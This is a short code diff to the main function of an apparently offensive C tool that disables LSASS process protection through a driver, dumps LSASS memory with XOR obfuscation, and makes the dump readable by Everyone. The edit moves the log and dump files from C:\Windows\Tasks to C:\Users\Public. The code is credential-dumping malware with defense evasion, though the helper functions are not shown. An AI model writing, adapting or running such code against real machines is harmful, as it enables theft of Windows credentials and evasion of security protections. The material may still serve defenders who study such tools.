@@ -11,7 +11,7 @@
 int main(void)
 {
     // Initialize logger
-    logfile = fopen("C:\\Windows\\Tasks\\log.txt", "a");
+    logfile = fopen("C:\\Users\\Public\\log.txt", "a");
     setvbuf(logfile, NULL, _IONBF, 0); // Disable buffering
 
     // Resolve required API functions
@@ -54,7 +54,7 @@ int main(void)
     disablePPL();
 
     // Clone LSASS and create XOR'd dump
-    if (!DumpAndXorLsass("C:\\Windows\\Tasks\\doppelganger.dmp", XOR_KEY, key_len)) {
+    if (!DumpAndXorLsass("C:\\Users\\Public\\doppelganger.dmp", XOR_KEY, key_len)) {
         log_error("Failed to dump and XOR LSASS.");
         StopAndUnloadDriver(DRIVER_NAME);
         return 1;
@@ -63,7 +63,7 @@ int main(void)
     restorePPL();
 
     // Set GENERIC_READ permissions to "Everyone"
-    if (!SetFileGenericReadAccess("C:\\Windows\\Tasks\\doppelganger.dmp")) {
+    if (!SetFileGenericReadAccess("C:\\Users\\Public\\doppelganger.dmp")) {
         log_error("Could not set GENERIC_READ permissions for Everyone.");
     }
 
@@ -73,6 +73,5 @@ int main(void)
     // Done
     log_info("Execution completed successfully.");
     fclose(logfile);
-
     return 0;
 }
